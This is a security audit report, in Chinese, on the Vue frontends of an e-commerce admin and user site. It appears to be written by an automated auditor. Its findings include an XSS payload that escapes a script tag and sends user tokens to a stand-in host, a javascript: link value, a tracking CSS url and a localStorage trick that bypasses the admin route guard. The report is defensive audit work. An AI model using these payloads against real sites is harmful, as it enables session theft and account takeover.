# HCZ 前端安全审计报告（06-frontend）

- 审计范围：`frontend/admin/`（管理后台 Vue 3 + TS）、`frontend/user/`（用户端 Vue 3 + TS）
- 审计方式：**纯只读**（Read / Grep / Glob），未对项目源文件做任何 Edit/Write/删除，未执行 `npm install` / 格式化 / git 操作
- 技术栈：Vue 3.5 + vue-router 4 + Pinia 3 + Vite 7 + vue-i18n 9 + reka-ui + Tiptap 2.27 + DOMPurify 3.4
- 认证方式：JWT Bearer Token（Authorization header），**无 Cookie 认证**，无 `withCredentials`
- 审计日期：2026-10-07

---

## 发现汇总

| ID | Severity | Title |
|---|---|---|
| ISSUE-F01 | **P1** | JSON-LD `<script>` 标签逃逸：商品名/SEO 描述可注入 `</script>` 实现存储型 XSS |
| ISSUE-F02 | P2 | 站点装修/外链 `:href` 无协议白名单，`link_value`/`url`/`action_target` 可写入 `javascript:` / `data:` |
| ISSUE-F03 | P2 | JWT（`admin_token` / `user_token`）存 localStorage，任何 XSS 即可全量窃取会话 |
| ISSUE-F04 | P3 | 管理后台生产构建未 drop console/debugger，错误信息残留线上包 |
| ISSUE-F05 | P3 | 媒体库上传仅 `accept="image/*"` 提示，JS 层只校验大小不校验类型/扩展名 |
| ISSUE-F06 | P3 | 公告弹窗/分销商公告预览的 DOMPurify 白名单显式放行 `style` 属性（CSS 注入面） |
| ISSUE-F07 | P3 | 管理后台前端路由权限为 localStorage 缓存的 advisory 校验，可被绕过（后端必须强制） |
| ISSUE-F08 | P3 | 管理端 Settings 残留"自定义 JS 注入"表单（已 v-show=false 隐藏），数据仍回写 site_config |

无 P0。

---

### ISSUE-F01
- Severity: P1
- Title: 商品 JSON-LD 结构化数据存在 `<script>` 标签逃逸，可被商品标题/描述注入存储型 XSS
- File: `frontend/user/src/composables/useProductDetail.ts`
- Component/Function: `useProductDetail()` → useHead script payload（line 608-631）
- API: `GET /api/v1/products/:slug`（商品数据，含 `title` / `seo_meta.description` / `category.name`）
- Root Cause: `JSON.stringify(jsonLd)` 直接作为 `<script type="application/ld+json">` 的 `innerHTML` 注入。`JSON.stringify` **不会转义 `</script>` 序列**。当商品标题（管理员录入，或分销商 ResellerProductSettingsPanel 可编辑）包含字符串 `</script><script>...</script>` 时，浏览器 HTML 解析器在第一个 `</script>` 处提前结束脚本块，其后的内容变成可执行脚本，在商品详情页所有访客浏览器中原地执行。
- Exploit/Trigger:
  1. 管理员/有权限的分销商把商品名（或 SEO 描述、分类名）设为：
     `x</script><script>fetch('https://evil.example/?t='+localStorage.getItem('user_token'))<\/script>`
  2. 任一用户打开该商品详情页 `/products/:slug`，脚本执行，`user_token` 被外带 → 该用户账号被接管。
- Impact: 存储型 XSS，影响面 = 该商品详情页全部访客；与 F03（token 在 localStorage）组合即全量会话窃取。多租户场景下单个分销商可借此投毒所有访问其店铺的用户。
- Evidence:
  ```ts
  // useProductDetail.ts:608-631
  const jsonLd: Record<string, any> = {
    '@context': 'https://schema.org',
    '@type': 'Product',
    name: title,                       // ← 管理员/分销商可控，含 </script> 即可逃逸
    url: canonicalUrl.value || window.location.href,
    offers: { ... },
  }
  if (description) jsonLd.description = description   // ← seo_meta.description 同样可控
  if (product.value.category?.name) jsonLd.category = getLocalizedText(product.value.category.name)
  return [{
    type: 'application/ld+json',
    innerHTML: JSON.stringify(jsonLd),   // ← 未转义 </script>，未做 JSON 内容消毒
  }]
  ```
- Recommended Fix:
  1. 序列化后把 `<` 全部转义为 `\u003c`（最小改动）：`JSON.stringify(jsonLd).replace(/</g, '\\u003c')`；
  2. 或对 title/description/category 字段做 HTML 转义后再塞入 jsonLd；
  3. 后端对商品名/SEO 描述中 `</` 序列做拒绝或转义（纵深防御）。

### ISSUE-F02
- Severity: P2
- Title: 站点装修外链字段无 URL 协议白名单，`:href` 可渲染 `javascript:` / `data:`
- File:
  - `frontend/user/src/views/Discovery.vue`（line 26, 61, 84, 107）
  - `frontend/user/src/components/home/HomeExperience.vue`（line 23, 78）
  - `frontend/user/src/views/About.vue`（line 47, 55）
  - `frontend/user/src/utils/siteConfig.ts`（`normalizeHomeEntries` line 91-94，未校验外链协议）
- Component/Function: `resolveBlockLink()`（Discovery.vue:307-313）、`normalizeHomeEntries()`、`bannerLink()`
- API: `GET /api/v1/public/config`（discovery_blocks / home_entries / banners / contact_config）
- Root Cause: `resolveBlockLink` 对 `link_type === 'external'` 直接返回 `{ external: true, href: link_value }`，**不校验协议**；`card_grid` 的 `action_type==='external'` 分支、`external_link` 区块的 `config.url`、首页 `home_entries` 的外链、About 页 `contact_config.telegram/whatsapp` 全部原样绑定到 `:href`。Vue 3 不对 `:href` 做协议消毒。
- Exploit/Trigger: 管理员在 site-builder 配置 discovery block：`link_type=external, link_value=javascript:alert(document.cookie)`（或 `data:text/html,<h1>钓鱼</h1>`）。
- Impact: 现代 Chrome/Firefox 对 `target="_blank"` 的 `javascript:` 已拦截，本站这些外链大多带 `target=_blank rel=noopener`，实际可利用性下降；但（a）`data:text/html` 仍可在新标签页打开钓鱼页面；（b）旧内核/WebView/内置浏览器仍可能执行 `javascript:`；（c）与已严格 DOMPurify 消毒的富文本体系不一致，属于消毒口径缺口。
- Evidence:
  ```ts
  // Discovery.vue:307-313 —— external 分支零协议校验
  const resolveBlockLink = (linkType: string, linkValue: string): ResolvedLink => {
    const lt = String(linkType || 'none')
    const lv = String(linkValue || '').trim()
    if (lt === 'external' && lv) return { external: true, href: lv }   // ← 无 https?: 校验
    if (lt === 'internal' && lv) return { external: false, href: resolveInternalPath(lv) }
    return { external: false, href: '' }
  }
  // Discovery.vue:107 —— external_link 区块完全裸绑定
  <a :href="String(block.config?.url)" target="_blank" rel="noopener" class="disc-ext-card">
  // siteConfig.ts:91-94 —— 归一化时 external 类型也不校验协议
  let actionTarget = String(item?.action_target || item?.url || '').trim()
  if (actionType === 'internal' && (!actionTarget || !actionTarget.startsWith('/'))) { ... }
  ```
- Recommended Fix: 对所有外链统一加白名单 `^https?:\/\/`（mailto: 除外），非白名单降级为 `#` 或站内路径；在 `normalizeHomeEntries` / `resolveBlockLink` 层统一过滤，而非各页面散点处理。

### ISSUE-F03
- Severity: P2
- Title: JWT 存储在 localStorage，XSS 即可窃取全部会话（管理端 + 用户端）
- File:
  - `frontend/admin/src/stores/auth.ts`（line 10, 109, 132, 195）
  - `frontend/user/src/stores/userAuth.ts`（line 9, 31, 42）
  - `frontend/admin/src/api/client.ts`（line 113-116）
  - `frontend/user/src/api/client.ts`（line 96-99）
- Component/Function: login/verify2FA/setToken / 请求拦截器 Authorization header
- API: 全部 `/api/v1/**`
- Root Cause: 登录成功后 `localStorage.setItem('admin_token', token)` / `localStorage.setItem('user_token', token)`，请求时 `headers['Authorization'] = Bearer ${token}`。localStorage 同源可读，任何一处 XSS（如 F01、F02 残留）即可 `fetch('//evil/?'+localStorage.user_token)` 全量外带。
- Exploit/Trigger: 任一存储型 XSS 落地后，一行 JS 即可拖走全部在线用户与管理员 token，无 HttpOnly/Secure/SameSite 保护。
- Impact: 会话失窃 → 用户资产（钱包/C2C/订单）与管理端全部权限沦陷。logout 时双方均正确清理 token（admin: auth.ts:193-197；user: userAuth.ts:39-44），401 时也会清理（admin client.ts:26-29；user client.ts:152-182），生命周期管理正确，问题仅在存储介质选择。
- Evidence:
  ```ts
  // user stores/userAuth.ts:29-32
  const setToken = (newToken: string) => {
    token.value = newToken
    localStorage.setItem('user_token', newToken)   // ← 非 HttpOnly
  }
  // admin api/client.ts:113-116
  const token = localStorage.getItem('admin_token')
  if (token) headers['Authorization'] = `Bearer ${token}`
  ```
- Recommended Fix: 中长期改为 HttpOnly + Secure + SameSite=Lax Cookie 下发 refresh token，localStorage 只放短期内存态 access token；短期必须保证 XSS 面（F01/F02）归零。

### ISSUE-F04
- Severity: P3
- Title: 管理后台生产构建未 drop console/debugger
- File: `frontend/admin/vite.config.ts`
- Component/Function: build 配置
- Root Cause: 用户端 `frontend/user/vite.config.ts:37` 有 `esbuild: mode === 'production' ? { drop: ['console', 'debugger'] } : {}`，管理后台 `vite.config.ts` **没有对应配置**，`src/api/client.ts`、`TelegramBotBroadcastDetail` 等多处 `console.error('HTTP Error:', message)` 会随生产包发出。
- Impact: 泄露后端错误 msg（可能含内部路径/参数），信息收集面扩大；无 token 打印（已核查 client.ts 不打印 Authorization）。
- Evidence:
  ```ts
  // frontend/admin/vite.config.ts —— 无 esbuild.drop 配置
  build: { rollupOptions: { output: { manualChunks: { ... } } }, chunkSizeWarningLimit: 600 }
  // 对比 user vite.config.ts:37
  esbuild: mode === 'production' ? { drop: ['console', 'debugger'] } : {},
  ```
- Recommended Fix: admin vite.config 同样加 `esbuild: { drop: ['console', 'debugger'] }`（或至少在生产构建剥离）。

### ISSUE-F05
- Severity: P3
- Title: 媒体库上传组件仅依赖 `accept="image/*"`，JS 层未校验扩展名/MIME
- File: `frontend/admin/src/views/admin/Media.vue`（line 135, 259）、`frontend/admin/src/utils/upload.ts`
- Component/Function: `handleFiles` → `splitFilesBySize()`
- Root Cause: `splitFilesBySize`（upload.ts:13-24）只按大小过滤；`<input accept="image/*">` 可被系统文件选择器"所有文件"绕过。前端可提交 `.svg` / `.html` / `.exe`。SVG 若由后端以 `image/svg+xml` 同源返回，内含 `<script>` 即存储型 XSS。
- Impact: 前端校验形同虚设；能否利用完全取决于后端上传白名单与 Content-Type 返回（后端审计需复核：拒绝 svg/html、图片重编码、下载头）。
- Evidence:
  ```ts
  // Media.vue:135 —— 只按大小分流
  const { accepted: fileList, rejected } = splitFilesBySize(Array.from(files))
  // upload.ts:13-24
  export function splitFilesBySize(files: File[], maxSize = DEFAULT_UPLOAD_MAX_SIZE_BYTES) {
    const accepted: File[] = []; const rejected: File[] = []
    files.forEach((file) => { file.size > maxSize ? rejected.push(file) : accepted.push(file) })
    return { accepted, rejected }
  }
  // 对比用户端工单附件 AttachmentUploader.vue:70-72 有扩展名白名单 + 大小，做得对
  const ACCEPTED_EXT = ['.jpg', '.jpeg', '.png', '.webp', '.pdf', '.txt', '.log']
  ```
- Recommended Fix: 前端按扩展名 + MIME 双重白名单（参考 AttachmentUploader）；后端必须强制二次校验。

### ISSUE-F06
- Severity: P3
- Title: 公告弹窗/分销商公告预览的 DOMPurify 白名单放行 `style` 属性
- File:
  - `frontend/user/src/components/AnnouncementModal.vue`（line 29-34）
  - `frontend/user/src/components/reseller/ResellerSiteConfigPanel.vue`（line 535-540）
- Component/Function: `sanitizedContent` / `announcementPreviewHtml`
- Root Cause: 两处显式 `ALLOWED_ATTR: [..., 'style', ...]`。`style` 未做 CSS 白名单过滤，可写入 `background:url(//evil/track.gif)`（访问统计/点击劫持 UI 伪装）、`position:fixed` 悬浮层覆盖页面。脚本执行被 DOMPurify 挡住，但 CSS 注入面保留。
- Impact: 站点被管理员/分销商配置公告时注入恶意 CSS（钓鱼悬浮、数据外带像素）。
- Evidence:
  ```ts
  // AnnouncementModal.vue:29-34
  return DOMPurify.sanitize(withImages, {
    ALLOWED_TAGS: [...],
    ALLOWED_ATTR: ['href', 'target', 'rel', 'src', 'alt', 'title', 'style', 'colspan', 'rowspan', 'width'],
    //                                                      ^^^^^ 放行 style
    ...
  })
  ```
- Recommended Fix: 移除 `style`，或用 DOMPurify `CUSTOM_ATTR_ALLOWED` / 自实现 CSS 白名单（只允许 color/background-color/text-align）。

### ISSUE-F07
- Severity: P3
- Title: 管理后台前端路由权限为 localStorage 缓存的 advisory 校验，可被本地篡改绕过
- File: `frontend/admin/src/router/index.ts`（line 522-555）、`frontend/admin/src/stores/auth.ts`（line 160-181）
- Root Cause: 路由守卫 `hasPermission()` 读取 localStorage 中的 `admin_permissions`/`admin_is_super`；浏览器控制台一行 `localStorage.setItem('admin_is_super','1')` 即可渲染全部菜单/页面。前端拦截可绕过，**安全边界必须在后端 JWTAuthMiddleware + Authz 中间件**。
- Impact: 仅为 UI 层防护；若后端任何 admin 路由漏挂权限中间件，此前端守卫会给人"已隔离"的错觉。已确认 `/dashboard`、`/security`、`/forbidden` 无 meta.permission（可接受：面板首页/自助安全设置）。
- Evidence:
  ```ts
  // router/index.ts:542-552
  const requiredPermission = typeof to.meta.permission === 'string' ? to.meta.permission : ''
  if (requiredPermission && !authStore.hasPermission(requiredPermission)) {
    return { path: '/forbidden', query: { from: to.fullPath } }
  }
  ```
- Recommended Fix: 保持现状但在文档中明确"前端菜单隐藏 ≠ 权限"；后端逐接口复核 Authz。

### ISSUE-F08
- Severity: P3
- Title: 管理端 Settings 残留"自定义 JS 注入"表单（已隐藏），数据仍回写 site_config
- File: `frontend/admin/src/views/admin/Settings.vue`（line 1063-1123）
- Component/Function: scripts 配置 Tab
- Root Cause: 按 Phase 9 安全要求，用户端 `frontend/user/src/utils/customScripts.ts` 已改为空实现（`applyCustomScripts` no-op，注释明确"不再创建/插入任何 <script> 节点"），但管理端 Settings.vue 的 scripts 编辑区仅 `v-show="false"` 隐藏，数据仍随 site_config 提交。i18n 文案仍写着"支持完整 script 标签…脚本不会在页面中可视化展示"。
- Impact: 若后端在 server-side 渲染 index.html 时直接把 `script.code` 拼进 `<head>`，则这是管理员级 RCE-in-browser（设计如此，但用户端前端已确认不执行）。需后端审计确认模板层未注入。
- Evidence:
  ```ts
  // Settings.vue:1063-1064
  <!-- scripts 编辑已按 Phase 9 要求隐藏（数据仍随 site_config 回写，不删除） -->
  <div v-show="false" class="rounded-xl border border-border bg-card">
  // user customScripts.ts:12-14
  export const applyCustomScripts = (_rawScripts: unknown): void => {
    // 故意空实现：不执行后台下发的任何脚本
  }
  ```
- Recommended Fix: 后端模板层不得直接 echo `site_config.scripts[].code`；如已废弃建议清理数据结构。

---

## XSS 攻击面矩阵

| Location | User Input | Output Method | Sanitized | Result |
|---|---|---|---|---|
| user BlogDetail.vue:58 | 博客正文（管理员 Tiptap） | v-html | ✅ `sanitizeRichHtml` = DOMPurify 默认白名单 | 安全 |
| user ProductDetail.vue:328 | 商品富文本描述 | v-html | ✅ DOMPurify 默认白名单 | 安全 |
| user OrderDetail.vue:211/270 | 商品 instructions（后台富文本） | v-html | ✅ `sanitizeInstructionsHtml`（FORBID style） | 安全 |
| user AnnouncementModal.vue:166 | 首页公告 content | v-html | ⚠️ DOMPurify 但放行 `style`（F06） | CSS 注入 |
| user Legal.vue:19 | 条款/隐私（站长/分销商配置） | v-html | ✅ DOMPurify.sanitize | 安全 |
| user ResellerSiteConfigPanel.vue:252 | 分销商公告预览 | v-html | ⚠️ 放行 `style`（F06） | CSS 注入 |
| admin SystemUpdateDialog.vue:417 | GitHub Release Markdown | v-html | ✅ `renderReleaseNotes` 严格白名单 + URI 白名单 + 单测固化 | 安全 |
| admin TelegramBotBroadcastDetail.vue:156 | 广播 message_html | v-html | ✅ DOMPurify 默认白名单 | 安全 |
| user useProductDetail.ts:630 | 商品 title / seo description / category.name | `<script type=ld+json>` innerHTML | ❌ **无消毒，`</script>` 逃逸（F01）** | **存储型 XSS** |
| user Discovery.vue:26/61/84/107 | 装修 link_value/url/action_target | `:href` | ❌ 无协议白名单（F02） | javascript:/data: 面 |
| user HomeExperience.vue:23/78 | banner/entry link_value | `:href`（banner 有 @click.prevent） | ⚠️ 无协议白名单，click.prevent 兜底（F02） | 降级 |
| user About.vue:47/55 | contact telegram/whatsapp | `:href` target=_blank | ❌ 无协议白名单（F02） | data:/javascript: 面 |
| user TicketConversation.vue | 工单消息 | 文本插值 `{{ }}` | ✅ Vue 默认转义 | 安全 |
| admin/user TurnstileCaptcha.vue:75 | — | `innerHTML = ''` | ✅ 空串赋值 | 安全 |
| user useLogin.ts:377 | Telegram 挂件容器 | `innerHTML = ''` | ✅ 空串赋值 | 安全 |
| user SecurityPanel.vue:403 | — | `innerHTML = ''` | ✅ 空串赋值 | 安全 |

## API Client 安全清单

| 检查项 | admin | user |
|---|---|---|
| Token 位置 | localStorage `admin_token`（F03） | localStorage `user_token`（F03） |
| 发送方式 | `Authorization: Bearer`（client.ts:113-116） | `Authorization: Bearer`（client.ts:96-99） |
| Cookie 认证 / withCredentials | 无 | 无（`credentials` 默认 same-origin，未使用 Cookie 鉴权） |
| CSRF 风险 | **低**：Bearer 不随 Cookie 自动携带 | 低 |
| 响应拦截器打印敏感信息 | 无 console.log token；仅 notifyError(msg) | console.error(msg) 仅业务消息，无 token（生产 drop console） |
| 401 处理 | 清 admin_token + 跳 /login（client.ts:26-29） | 清 user_token/user_profile + 跳 /auth/login（client.ts:152-182） |
| 403 处理 | 提示 forbidden，不跳登录 | 同左 |
| 硬编码 token/secret | 未发现 | 未发现 |
| 金额字段由前端提交 | 管理端不涉及下单 | C2C 建单仅 `listing_id + usdt_amount`（价格后端按 listing 重算）；下单 payload 仅 `items/coupon_code/affiliate_code/channel_id/use_balance`，**不含 price/total**；提现 fee/net 由后端 quote 返回；佣金转账 amount 用户输入但后端应有下限校验 |
| 幂等键 | StepUpConfirmDialog 每次操作生成 UUID | C2C createTrade 自动 `Idempotency-Key: crypto.randomUUID()`；下单 ensureIdempotencyKey |
| 超时 | AbortController 10s | 10s |

## Token 存储与认证流程

- **登录（用户端）**：`POST /auth/login` → 返回 `{ token, user }` → `setToken` 写 localStorage → 后续请求带 Bearer。2FA：首登返回 `requires_totp + challenge_token`（内存态，不落盘），`verify2FA` 后才发正式 token。
- **登录（管理端）**：两步 challenge（密码 → TOTP），`admin_token` 落 localStorage，随后 `loadAuthz()` 拉取角色/策略缓存到 localStorage 供菜单渲染。
- **登出**：admin `logout()` 清 token+authz 缓存；user `clearAuth()` 清 token+profile；401 拦截器同样清理。✅ 生命周期正确。
- **风险点**：localStorage 对任意同源脚本可读（F03）；无 refresh token 机制可见（token 一次签发）；管理员 token 泄露后无前端"强制下线"动作（依赖后端黑名单/短有效期）。

## 前端路由权限矩阵（admin）

- 全部业务路由均带 `meta.permission: 'METHOD:/admin/...'`，守卫对照 localStorage 缓存的策略集做菜单级隐藏。
- **无 meta.permission 的路由**：`/login`（公开）、`/` dashboard 首页（任意已登录管理员）、`/forbidden`、`/security`（自助改密/2FA）。评估：可接受。
- 客户端绕过：`localStorage.admin_is_super='1'` + 刷新即可渲染全部页面（F07）——**后端必须逐接口鉴权**。
- 用户端路由：`requiresUserAuth` 仅判断 localStorage 有无 token；无角色级区分（用户端本就不分角色，分销商控制台另有 `canAccessResellerConsole` 前端判断 + 后端校验）。

## 构建/依赖真实结果

| 项 | 结果 |
|---|---|
| `npm audit` | **FAILED/SKIPPED**：执行 `npm audit --json` 被 registry（npmmirror）拒绝：`404 Not Found - /-/npm/v1/security/* not implemented yet`。项目实际用 pnpm 10.34.3，未在本审计环境跑 `pnpm audit`（零改动约束）。依赖版本较新（vue 3.5.24 / vite 7.2 / DOMPurify 3.4 / reka-ui 2.9），未发现已知高危包名。 |
| typecheck / lint / build | **SKIPPED**（零代码改动约束，未执行 `vue-tsc` / `vite build`） |
| source map | 两个 vite.config 均未配置 `build.sourcemap` → 默认 false，生产不暴露 sourcemap ✅ |
| `.env` | user 仅有 `.env.example` + `.env.development.local`（仅 `VITE_DEV_PREVIEW_MODE=true`）；无密钥泄露 ✅ |
| 硬编码密钥 | 全仓正则扫描 `(api_key|secret|password|token)\s*[:=]\s*['"]\S{16,}` 仅命中模板 props（`:card-secret`、`:requires-old-password`），无真实密钥 ✅ |
| i18n 内容 | user locales（zh-CN/en-US/zh-TW）grep `<script|javascript:|<img|onerror` 0 命中；admin i18n 内嵌文案仅 scripts 功能提示文本（F08），无注入载荷 ✅ |
| 第三方脚本执行 | `customScripts.ts` 已 no-op；`applyCustomScripts` 不注入任何 script 节点 ✅ |

## 结论

- **P1 × 1**（F01 JSON-LD 逃逸）：建议本迭代内修复，改动极小（序列化后转义 `<`）。
- **P2 × 2**（F02 外链无协议白名单、F03 localStorage 存 JWT）：F02 修复简单（统一 `^https?:` 白名单）；F03 是架构权衡，配合 XSS 面收敛即可接受。
- **P3 × 5**：均为纵深防御/卫生类问题。
- 正面：富文本 v-html 体系整体已系统性接入 DOMPurify（含 release notes 严格白名单 + 单测固化），无 eval/new Function/document.write，无硬编码密钥，下单/建单不提交前端价格，幂等键齐备，工单消息纯文本渲染。

## 已验证 / NOT VERIFIED

- ✅ 已验证：所有 v-html 渲染点及其消毒链（Read 源码逐点确认）；token 存储位置；无 withCredentials；无硬编码密钥；i18n 无脚本；下单/C2C 提交字段；customScripts no-op；DEV_PREVIEW 仅在 `import.meta.env.DEV` 开启。
- ❌ NOT VERIFIED：后端是否逐 admin 路由强制 Authz（前端守卫可绕过，F07）；后端上传白名单（F05 能否被打成 SVG 存储 XSS 取决于后端）；后端模板是否注入 site_config.scripts（F08）；商品标题长度/字符限制（F01 利用门槛取决于后端）；`pnpm audit` 真实结果（registry 限制 SKIPPED）。
